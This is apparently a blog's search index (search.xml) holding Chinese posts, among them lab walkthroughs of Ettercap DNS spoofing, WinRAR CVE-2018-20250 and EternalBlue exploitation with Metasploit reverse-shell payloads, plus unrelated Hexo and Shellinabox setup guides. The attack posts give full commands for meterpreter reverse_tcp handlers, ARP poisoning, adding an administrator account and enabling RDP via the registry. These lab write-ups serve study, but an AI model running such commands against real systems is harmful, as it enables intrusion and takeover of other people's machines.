@@ -1,0 +1,93 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title><![CDATA[使用Shellinabox在浏览器进行ssh登录]]></title>
+    <url>%2F2019%2F03%2F21%2F%E4%BD%BF%E7%94%A8Shellinabox%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%BF%9B%E8%A1%8Cssh%E7%99%BB%E5%BD%95%2F</url>
+    <content type="text"><![CDATA[shellinabox介绍Shellinabox 是一个利用 Ajax 技术构建的基于 Web 浏览器的远程终端模拟器，安装该软件后，服务器端不需要开启 ssh服务，通过 Web 浏览器就可以对远程主机进行操作。使用来登录到系统http://IP:4200，在启用了SSL/TLS证书，需要用http://IP:4200来登录。默认情况下shellinabox使用的是4200端口。 shellinabox安装使用的是系统是Kali Linux 2019，在终端输入 1apt install shellinabox 如果提示无法找到包，请添加国内更新源 123456789gedit /etc/apt/sources.list//添加下列更新源#清华大学 [更新源]deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free #浙江大学[更新源]deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free shellinabox参数1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859List of command line options: -b, --background[=PIDFILE] run in background -c, --cert=CERTDIR set certificate dir (default: $PWD) --cert-fd=FD set certificate file from fd --css=FILE attach contents to CSS style sheet --cgi[=PORTMIN-PORTMAX] run as CGI -d, --debug enable debug mode -f, --static-file=URL:FILE serve static file from URL path -g, --group=GID switch to this group (default: nogroup) -h, --help print this message --linkify=[none|normal|aggressive] default is "normal" --localhost-only only listen on 127.0.0.1 --no-beep suppress all audio output -n, --numeric do not resolve hostnames -m, --messages-origin=ORIGIN allow iframe message passing from origin --pidfile=PIDFILE publish pid of daemon process -p, --port=PORT select a port (default: 4200) -s, --service=SERVICE define one or more services -t, --disable-ssl disable transparent SSL support --disable-ssl-menu disallow changing transport mode --disable-utmp-logging disable logging to utmp and wtmp -q, --quiet turn off all messages --unixdomain-only=PATH:USER:GROUP:CHMOD listen on unix socket -u, --user=UID switch to this user (default: nobody) --user-css=STYLES defines user-selectable CSS options -v, --verbose enable logging messages --version prints version information --disable-peer-check disable peer check on a sessionDebug, quiet, and verbose are mutually exclusive.One or more --service arguments define services that should be made availablethrough the web interface: SERVICE := &lt;url-path&gt; ':' APP APP := 'LOGIN' | 'SSH' [ : &lt;host&gt; ] | USER ':' CWD ':' CMD USER := 'AUTH' | &lt;username&gt; ':' &lt;groupname&gt; CWD := 'HOME' | &lt;dir&gt; CMD := 'SHELL' | &lt;cmdline&gt;&lt;cmdline&gt; supports variable expansion: $&#123;columns&#125; - number of columns $&#123;gid&#125; - gid id $&#123;group&#125; - group name $&#123;home&#125; - home directory $&#123;lines&#125; - number of rows $&#123;peer&#125; - name of remote peer $&#123;realip&#125; - value of HTTP header field 'X-Real-IP' $&#123;uid&#125; - user id $&#123;url&#125; - the URL that serves the terminal session $&#123;user&#125; - user nameOne or more --user-css arguments define optional user-selectable CSS options.These options show up in the right-click context menu: STYLES := GROUP &#123; ';' GROUP &#125;* GROUP := OPTION &#123; ',' OPTION &#125;* OPTION := &lt;label&gt; ':' [ '-' | '+' ] &lt;css-file&gt;OPTIONs that make up a GROUP are mutually exclusive. But individual GROUPs areindependent of each other. 12345678-b,--background[=PIDFILE] 后台运行-c, --cert=CERTDIR 指定证书目录（默认当前工作路径）-p, --port=PORT 更改端口 (默认: 4200)-t, --disable-ssl 关闭SSL传输-q, --quiet 安静模式，禁用所有信息-u, --user=UID 设置登录用户 (默认: nobody)-v, --verbose 开启登录信息提示--version 显示版本信息 shellinabox启动1`shellinaboxd -b -t` 启动服务之后，在浏览器访问http://IP:4200默认4200端口，可以自己修改shellinabox默认禁止root登陆，所以Kali系统需要新建一个用户登录 使用Ngrok将服务映射到外网建立隧道在Ngrok建立隧道，注意本地端口填写启动Shellinabox的端口 开启映射开启映射之前需要先下载客户端 1wget https://www.ngrok.cc/sunny/linux_amd64.zip 将下载完成后，解压并开启 123unzip linux_amd64.zipcd /Desktop/linux_amd64./sunny clientid 隧道id 通过外网登陆直接输入URL即可登录]]></content>
+      <categories>
+        <category>基础教程</category>
+      </categories>
+      <tags>
+        <tag>ssh登录</tag>
+        <tag>浏览器</tag>
+        <tag>Shellinabox</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[使用Ettercap实现DNS欺骗]]></title>
+    <url>%2F2019%2F03%2F19%2F%E4%BD%BF%E7%94%A8Ettercap%E5%AE%9E%E7%8E%B0DNS%E6%AC%BA%E9%AA%97%2F</url>
+    <content type="text"><![CDATA[前言什么是中间人攻击中间人攻击（Man-in-the-middle attack，缩写：MITM）是指攻击者与通讯的两端分别建立独立的联系，并交换其所收到的数据，使通讯的两端认为他们正在通过一个私密的连接与对方直接对话，但事实上整个会话都被攻击者完全控制。在中间人攻击中，攻击者可以拦截通讯双方的通话并插入新的内容。在许多情况下这是很简单的（例如，在一个未加密的Wi-Fi 无线接入点的接受范围内的中间人攻击者，可以将自己作为一个中间人插入这个网络）。 一个中间人攻击能成功的前提条件是攻击者能将自己伪装成每一个参与会话的终端，并且不被其他终端识破。中间人攻击是一个（缺乏）相互认证的攻击。大多数的加密协议都专门加入了一些特殊的认证方法以阻止中间人攻击。例如，SSL协议可以验证参与通讯的一方或双方使用的证书是否是由权威的受信任的数字证书认证机构颁发，并且能执行双向身份认证。 DNS欺骗DNS欺骗攻击是一种非常危险的中间人攻击，它容易被攻击者利用并且窃取用户的机密信息。虽然这篇文章可以提供一些新的见解，但重要的是DNS欺骗是一个一般概念，有无数种方法可以实现一个DNS欺骗攻击。在一个DNS欺骗攻击中，攻击者可以利用一个漏洞来伪造网络流量。因此，要理解DNS欺骗攻击，必须理解DNS是怎样工作的。 DNS(域名系统)在互联网中是一个非常重要的协议。它属于TCP/IP，是一个分层结构的分布式模块，它包含域名的相关信息。它负责在网络上映射域名到他们各自的IP上。DNS定位主机/服务器通过查看友好域名，使用域名系统，DNS将域名和IP地址相互映射 。这些设备（路由器、服务器等）连接到你的电脑不能理解一些友好的名称 （infosecinstitute.com）,他们只了解一个IP地址，而DNS负责翻译它。 让我们来看看下面这个图来理解主机和本地DNS服务器的正常通信。 DNS服务器包含着一个主数据库，其中包括信息的IP地址，因为这涉及到相应的域名。所以在这些正常的通信中，一个主机发送请求到服务器，之后服务器响应正确的信息。如果DNS没有信息传入的请求，它将发送请求到外部DNS服务器来获取正确的响应。那么攻击者如何使用中间人攻击来实施DNS欺骗呢？下图说明了答案 使用DNS欺骗中间人攻击，攻击者将截取会话，然后转移到一个假网站的会话。假如：用户希望访问google.com，并且谷歌的IP地址为173.194.35.37，攻击者就可以使用DNS欺骗技术拦截会话，并将用户重定向到假冒的网站，假网站IP可以为任意IP。 Ettercap介绍Ettercap是一个综合套件，适合中间人攻击。它具有实时连接嗅探、动态内容过滤等功能，支持对许多协议的主动和被动解析，并包含许多用于网络和主机分析的功能。 攻击过程攻击环境 角色 系统版本 IP 备注 靶机 Windows7（64bit） 192.168.59.135 攻击机 Kali Linux 64 Bit 2019.1a 192.168.59.138 攻击步骤开启本地web服务器在kali Linux系统中开启Apache服务 12service apache2 start #开启apache服务service apache2 status #查看apache状态 在web服务器中添加页面 123cd /var/www/html/mv index.html index.html.bak vi index.html 在文件中输入如下内容 123456789101112&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;This is a test page&lt;/title&gt; &lt;meta charset="utf-8"&gt;&lt;/head&gt;&lt;body&gt; &lt;div&gt; welcome mengnan &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 修改etter.dns1vi /etc/ettercap/etter.dns 在文件中添加 12www.*.com A 192.168.59.138www.*.com PTR 192.168.59.138 设置Etterap使用命令ettercap -G来进入ettercap的图形界面。 选择网卡Unfied sniffing 网卡选择eth0（根据自己的计算机网卡而定） 扫描主机扫描网关下的所以在线的计算机主机，来到hosts选项下的scan for hosts 点击Hosts list列出扫到的主机 选择攻击目标在列表里选择网关进行添加，我这里的网关是192.168.59.2。选中之后点击Add to target 1 选中IP为192.168.59.135的靶机，点击Add to target 2 进行攻击配置好后在继续点击mitm&gt;arp poisoning 勾选Sniff remote connections 选择插件plugins&gt;mangge the plugins 我们要进行的是DNS欺骗，双击dns_spoof可以看见下边的提示 最后点击strat&gt;start sniffing开始DNS欺骗 查看攻击效果在靶机上使用浏览器，输入http://www.baidu.com，会显示到我们设置的页面 其他以上就是使用Ettercap实现DNS欺骗的简单测试 DNS欺骗是一种非常危险的攻击，因为攻击者可以利用ettercap的dns_spoof插件和其他工具执行攻击。最终，攻击者可以使用一个社会工程工具包来执行攻击去控制受害者的电脑。想象一下这是多少容易，通过社会工程工具包和DNS欺骗技术你所需要做得就是配置你的社会工程工具包和你的IP清单，制作像谷歌一样的网站欺骗域名到你的IP地址上。当受害者打开google，你的攻击将使它访问你的IP，之后建立一个远程的会话。 参考：https://www.freebuf.com/articles/system/5265.html]]></content>
+      <categories>
+        <category>基础教程</category>
+      </categories>
+      <tags>
+        <tag>DNS欺骗</tag>
+        <tag>Ettercap</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[美杜莎爆破测试]]></title>
+    <url>%2F2019%2F03%2F19%2F%E7%BE%8E%E6%9D%9C%E8%8E%8E%E7%88%86%E7%A0%B4%E6%B5%8B%E8%AF%95%2F</url>
+    <content type="text"><![CDATA[前言使用美杜莎进行简单的爆破测试 测试环境 角色 系统版本 IP 备注 靶机 Windows7（64bit） 192.168.59.128 phpstudy版本为5.4.45 攻击机 Kali Linux 64 Bit 2019.1a 192.168.59.131 medusa版本为2.2 测试过程关闭靶机的防火墙关闭防火墙才能用nmap扫出端口，window7的防火墙还是很屌的。 启动phpstudy启动靶机的phpstudy，这样可以打开3306端口，我们就用美杜莎爆破这个端口。 ### nmap扫描靶机kali终端中输入nmap 192.168.59.128 #靶机ip]]></content>
+      <categories>
+        <category>爆破</category>
+      </categories>
+      <tags>
+        <tag>美杜莎</tag>
+        <tag>爆破</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[开启httpserver]]></title>
+    <url>%2F2019%2F03%2F18%2F%E5%BC%80%E5%90%AFhttpserver%2F</url>
+    <content type="text"><![CDATA[先查看python的版本 如果是2.7 cmd命令行输入python -m SimpleHTTPServer 8989 如果是3.7 cmd命令行输入python -m http.server 8989]]></content>
+      <categories>
+        <category>基础教程</category>
+      </categories>
+      <tags>
+        <tag>httpserver</tag>
+        <tag>python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[winrar漏洞复现]]></title>
+    <url>%2F2019%2F03%2F17%2Fwinrar%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%2F</url>
+    <content type="text"><![CDATA[前言Windows 操作系统下知名老牌的的压缩软件“WinRAR” 被国外安全研究团队爆出严重威胁用户的安全漏洞，被发现漏洞是“WinRAR”安装目录中的一个名为“UNACEV2.dll”的动态链接库文件，该文件自 2005 年发布至今就从未有过更新过，影响时长长达十余年之久。 漏洞细节: https://research.checkpoint.com/extracting-code-execution-from-winrar/ 影响版本 WinRAR &lt; 5.70 Beta 1 Bandizip&lt; = 6.2.0.0 好压(2345压缩) &lt; = 5.9.8.10907 360压缩 &lt; = 4.0.0.1170 漏洞复现环境1234| 角色 | 系统版本 | IP |备注 || ------ | ------ | ------ | ------ || 靶机| Windows7（64bit）| 192.168.59.128 | 安装winrar3.9版本 || 攻击机 | Kali Linux 64 Bit 2019.1a | 192.168.59.131 | Metasploit版本为5.0.2 | 漏洞复现过程使用Metasploit5生成免杀Payload123456789msfconsoleuse evasion/windows/windows_defender_exeshow infoset filename winrar.exe #生成免杀程序的名字set payload windows/meterpreter/reverse_tcpshow optionsset lhost 192.168.59.131 #攻击机的ipset lport 12345 #端口随便写，最好大于10000run 使用exp生成恶意程序下载exp：https://github.com/WyAtu/CVE-2018-20250/ 修改exp.py中的 evil_filename 值为&quot;winrar.exe&quot;，将 target_filename 的值改为&quot;.\hi.exe&quot;。 将刚才使用Metasploit生成的winrar.exe文件复制到下载的exp文件夹内，使用python exp.py命令生成恶意程序test.rar 值得注意的是，执行此命令需要python3以上的环境，另外如果在Linux系统中执行不成功可以尝试使用Windows系统来执行 这样病毒包就准备好了，接下来开始把病毒包发给靶机，并在kali中监听靶机 在Linux终端中运行如下命令 1234567msfconsoleuse exploit/multi/handlerset payload windows/meterpreter/reverse_tcpshow optionsset lhost 192.168.59.128 #靶机的ipset lport 12345run 在靶机中将test.rar解压，运行hi.exe，返回攻击机中Kali Linux会收到会话，此时执行shell即可获得靶机权限。]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>winrar</tag>
+        <tag>漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[漏洞复现-永恒之蓝]]></title>
+    <url>%2F2019%2F03%2F16%2F%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%2F</url>
+    <content type="text"><![CDATA[前言2017年5月12日起，全球范围内爆发基于Windows网络共享协议进行攻击传播的蠕虫恶意代码，这是不法分子通过改造之前泄露的NSA黑客武器库中“永恒之蓝”攻击程序发起的网络攻击事件。五个小时内，包括英国、俄罗斯、整个欧洲以及中国国内多个高校校内网、大型企业内网和政府机构专网中招，被勒索支付高额赎金才能解密恢复文件，对重要数据造成严重损失。本文在虚拟环境中，使用Nmap和Metasploit对病毒攻击进行复现，展示其攻击过程，供大家学习和参考。 复现准备漏洞描述Eternalblue通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。 漏洞影响目前已知受影响的 Windows 版本包括但不限于：Windows NT，Windows 2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。 复现环境 角色 系统版本 IP 备注 靶机 Windows7（64bit） 192.168.59.128 攻击机 Kali Linux 64 Bit 2019.1a 192.168.59.131 复现过程使用Nmap对靶机进行扫描在本地查找ms17-010漏洞 使用nmap对靶机进行扫描使用命令并执行 root@kali:/usr/share/nmap/scripts# nmap --script smb-vuln-ms17-010 192.168.59.128 使用Metasploit对目标进行监听输入msfconsole启动Metasploit在Metasploit中，输入search ms17-010查找永恒之蓝漏洞 输入use exploit/windows/smb/ms17_010_eternalblue执行漏洞输入show options查看当前攻击配置 将配置中第一行的RHOST修改为靶机IP地址 1set rhost 192.168.28.128 再次输入show options查看配置 配置完成后，使用run命令执行程序，如果执行成功，会进入windows系统的命令行 在命令行中输入whoami查看当前登录用户 在靶机创建用户并赋予管理员权限12net user username password /addnet localgroup administrators username /add 开启3389端口并使用远程桌面登录在命令行中输入REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f并执行，即可打开3389端口此时我们新建一个终端，输入rdesktop 192.168.28.128登录远程桌面 此时我们选择其他用户并使用刚才创建的用户登录，稍等便能登录到Windows桌面了 后记以上便是使用ms17-010永恒之蓝漏洞对靶机进行攻击的整个复现过程，由此可见攻击过程并不复杂，只需要简单的步骤即可完成攻击并获得极高的权限。由此我们也可以看到平常在使用计算机的时候要注重安全防护。 此漏洞应该在系统的自动更新或各电脑管家的更新中会提示修复的，大家可以查看一下自己的系统有没有安装，没有的话一定要安装]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>漏洞</tag>
+        <tag>永恒之蓝</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Github+hexo+next主题博客搭建教程]]></title>
+    <url>%2F2019%2F03%2F15%2FGithub%2Bhexo%2Bnext%E4%B8%BB%E9%A2%98%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%2F</url>
+    <content type="text"><![CDATA[本次我会逐步演示如何在Github上搭建自己的静态博客，先看看我之前已经搭建好的博客效果：https://zouchanglin.github.io 很多东西呢只是正对自己喜欢的风格来选择的，比如博客的风格，我自己比较喜欢Next主题的风格，Github上的项目地址是：https://github.com/iissnan/hexo-theme-next ，大家也可以根据自己喜欢的风格自行选择！ 工具Git工具这个不用说，提交代码必备，直接使用它的命令行工具就很OK，说到命令行大家也不用担心，常用的就那么几个，Git的下载地址：https://git-scm.com/download/win 安装过程很简单在此不赘述，安装完成后鼠标右键菜单就会多出两个选项：Git GUI Here 、Git Bash Here，其中Git Bash Here就可以在当前目录下打开Git的命令行！ Node.jsNode.js是一个Javascript运行环境,是一个基于Chrome JavaScript运行时建立的平台， 用于方便地搭建响应速度快、易于扩展的网络应用。Node.js 使用事件驱动， 非阻塞I/O 模型而得以轻量和高效，非常适合在分布式设备上运行数据密集型的实时应用。hexo正是需要这个环境，所以安装安装Node.js是必不可少的，下载链接：http://nodejs.cn/download/ 安装过程也是非常简单，不在赘述！ 上述工具安装完成后，打开Windows的命令行，分别输入3个命令看看是否安装完成:node -v 、npm -v 、git –version 出现版本号即说明安装完成！ HexoHexo简介hexo是个什么东西呢？总的来说就是把你的markdown文件转化为HTML静态页面的一种东西，浏览器是不会直接解析markdown文件的，所以我们需要把自己写的markdown文件先转化为HTML静态页面才能被浏览器解析，这个过程就需要Hexo来帮我们完成。更多内容请参考：http://coderunthings.com/2017/08/20/howhexoworks/ 这篇文章说的很详细！ 安装过程首先我们将本地的博客push到远程仓库中，本地博客得先有个存放位置，于是我们现在本地新建一个文件夹，名称随意(但是最好不要带中文和空格，对于一个程序员来讲，路径中包含中文或者空格简直是血的教训…)，我就在A盘下新建一个名称为hexo的文件夹 然后进入到刚刚新建的文件夹，右键Git Bash Here，输入npm install hexo -g，开始安装Hexo,安装完成后输入 hexo -v 查看版本，出现如图所示信息即使安装成功 完成上一步操作之后，我们需要初始化这个文件夹，输入hexo init 即可初始化该文件夹,可以看到初始化之后中文件夹中多出来了如此多的内容！ 接着我们需要安装一些组件，输入命令npm install 忙活了这么一大堆，现在该生成HTML静态资源文件了，输入命令hexo g完成页面的生成我们先在本地看看效果吧，输入hexo s开始服务器，地址是http://localhost:4000/ ,然后打开浏览器就会出现我们的页面： 出现上面的页面就意味着我们成功了一半！ Github博客仓库的建立申请一个Github账号https://github.com/github 打开网址申请账户 正式建立博客仓库 注意仓库名称一定是你的Github用户名.github.io才是可以的 我的用户名是JoeyJoestar，仓库名称就是JoeyJoestar.github.io 此时在浏览器输入https://joeyjoestar.github.io/，应该就会看到你的Github主页。 关联Github远程和本地仓库Git个人信息还是在博客根目录打开Git Bash Here 设置Github的用户名和email: 12git config --global user.name "Github用户名"git config --global user.email "注册Github使用的邮箱" 生成ssh密钥1ssh-keygen -t rsa -C "注册Github使用的邮箱" 找到刚才生成的ssh密匙文件，复制其中的全部内容 从Github页面右上角的用户头像中进入设置页面 点击左侧设置栏中的SSH and GPG keys 对SSH进行设置 Title随便填写，Key中粘贴刚才复制的密钥，然后点击Add SSH key 会让你再次输入一遍Github的密码 配置Deploy在博客根目录下找到_config.yml文件中，找到deploy，修改为 1234deploy: type: git repo: git@github.com:JoeyJoestar/JoeyJoestar.github.io.git branch: master 开始部署当上述操作都完成之后，输入命令 hexo g 重新生成一下,然后使用命令hexo d 部署到Github远程仓库，这个时候一般会遇到一个问题： 这个时候我们需要执行一条命令 1npm install --save hexo-deployer-git 出现上图则说明安装成功，接着我们就可以直接使用命令hexo d部署了，首次使用ssh密匙的时候，需要我们输入一个yes确认一下 接下来，看看我们部署的效果：https://你的Github用户名.github.io 由于我们还未安装自己的主题，所以看到的是hexo的默认主题，效果如下，如果暂时无法部署远程仓库的话就只能在本地使用hexo s开启服务器，然后访问http://localhost:4000/ 来查看效果! 安装主题下载主题这个主题大家可以自由选择，我个人比较推荐使用next主题，Github上的项目地址是：https://github.com/iissnan/hexo-theme-next ，大家也可以根据自己喜欢的风格自行选择！，选择Clone or download下载zip包即可，解压之后会获得一个叫做hexo-theme-next-master的文件夹，我们直接将文件夹重命名为next即可，然后将next文件夹copy到我们的博客根目录下 修改配置文件博客根目录下，有一个_config.yml文件，修改其中的属性theme: next,注意”:”后面有一个空格，修改之后保存！ 重新生成资源使用命令 hexo g 生成静态资源，主要是指html文件 重新部署使用命令 hexo d 重新部署到远程仓库，当然如果只是测试效果的话暂时其实没必要立马就部署到仓库，我们只需要 hexo s 开启本地服务器，然后访问http://localhost:4000/ 即可，然后就可以访问到修改过主题之后的效果 本地仓库配置文件与主题配置文件本次仓库配置文件博客根目录下，有一个_config.yml文件 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283# Hexo Configuration## Docs: https://hexo.io/docs/configuration.html## Source: https://github.com/hexojs/hexo/#博客名称title: 猛男#副标题subtitle: #简介description: #博客作者author: JoeyJoestar#博客语言language: zh-Hans#时区timezone: Asia/Shanghai# URL## 如果你的网站被放置在一个子目录中，将URL设置为“HTTP://YouSIT.COM/CHED”，并将根设置为“/CHOR/\”。url: https://joeyjoestar.github.io/root: /permalink: :year/:month/:day/:title/permalink_defaults:# Directorysource_dir: sourcepublic_dir: publictag_dir: tagsarchive_dir: archivescategory_dir: categoriescode_dir: downloads/codei18n_dir: :langskip_render:# Writingnew_post_name: :title.md # File name of new postsdefault_layout: posttitlecase: false # Transform title into titlecaseexternal_link: true # Open external links in new tabfilename_case: 0render_drafts: falsepost_asset_folder: falserelative_link: falsefuture: truehighlight: enable: true line_number: true auto_detect: false tab_replace:# Home page setting# path: Root path for your blogs index page. (default = '')# per_page: Posts displayed per page. (0 = disable pagination)# order_by: Posts order. (Order by date descending by default)index_generator: path: '' per_page: 10 order_by: -date# Category &amp; Tagdefault_category: uncategorizedcategory_map:tag_map:# 日期时间格式date_format: YYYY-MM-DDtime_format: HH:mm:ss# 分页，每页文章数量per_page: 10pagination_dir: page# 主题配置theme: next# Deployment## Docs: https://hexo.io/docs/deployment.htmldeploy: type: git repo: git@github.com:LiLiLiLaLa/LiLiLiLaLa.github.io.git branch: master 主题配置文件123456789101112131415 要显示的菜单：主页、关于、标签、分类、归档、日程、站内地图、公益404menu: home: / || home about: /about/ || user tags: /tags/ || tags categories: /categories/ || th archives: /archives/ || archive #schedule: /schedule/ || calendar #sitemap: /sitemap.xml || sitemap #commonweal: /404/ || heartbeat# Schemes(自己选择一种排版风格，我比较喜欢Mist这种) #scheme: Muse scheme: Mist #scheme: Pisces #scheme: Gemini 额外说明当上述步骤都完成之后，每次修改之后配置文件或者源文件的时候都需要使用hexo g命令重新生成静态资源，然后就可以在本地开启服务器进行预览 之后我们点击分别点击一下关于、标签、分类、日程，除了首页可以点击之外，其他的都会出现这样一个东西:Cannot GET /about/ 或者Cannot GET /categories/等等，这是由于我们没有在本地建立相关的静态文件导致的 还是在博客根目录下Git Bahs Here打开命令行，缺什么就新建什么，比如要新建关于、标签、分类、日程的页面 123hexo new page "about"hexo new page "tags"hexo new page "categories" 于是博客根目录下的source文件夹下就出现了about、tags、categories等文件夹，里分别有对应index.md文件 安装妹子 12npm install --save hexo-helper-live2dnpm install live2d-widget-model-hibiki 在hexo的配置文件后面添加 1234567891011121314151617# 2d妹子live2d: enable: true scriptFrom: local pluginRootPath: live2dw/ pluginJsPath: lib/ pluginModelPath: assets/ tagMode: false debug: false model: use: live2d-widget-model-hibiki display: position: right width: 150 height: 350 mobile: show: true]]></content>
+      <categories>
+        <category>基础教程</category>
+      </categories>
+      <tags>
+        <tag>博客搭建</tag>
+        <tag>妹子</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Hello World]]></title>
+    <url>%2F2019%2F03%2F15%2Fhello-world%2F</url>
+    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
+  </entry>
+</search>
